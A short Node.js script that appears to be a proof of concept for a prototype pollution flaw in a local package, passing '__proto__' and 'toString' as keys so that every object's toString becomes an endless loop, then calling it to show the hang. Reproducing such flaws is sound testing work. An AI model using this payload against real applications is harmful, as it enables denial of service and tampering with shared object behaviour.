const f = require("./package/code")

const config = {}
const op_type = '__proto__'
const branch_type = 'toString'
const value = function() { for (;;) {}}

try {
    f(config, op_type, branch_type, value)
} catch(e) {}

console.log({}.toString())